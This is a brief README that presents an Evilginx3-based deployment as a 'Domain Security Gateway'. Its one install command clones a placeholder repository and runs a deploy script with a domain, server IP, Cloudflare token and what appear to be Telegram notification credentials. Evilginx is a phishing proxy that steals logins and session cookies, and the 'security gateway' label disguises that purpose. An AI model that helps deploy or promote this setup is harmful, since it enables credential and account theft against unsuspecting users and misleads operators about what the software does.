# Domain Security Gateway

Professional security gateway deployment based on Evilginx3.

## 🚀 Installation

```bash
git clone https://github.com/YOUR_USERNAME/gateway-security.git
cd gateway-security
sudo bash deploy.sh \
  --domain example.com \
  --vps-ip 1.2.3.4 \
  --api-token CF-xxxxx \
  --notify-token "123456:ABC-def" \
  --notify-id "123456789"
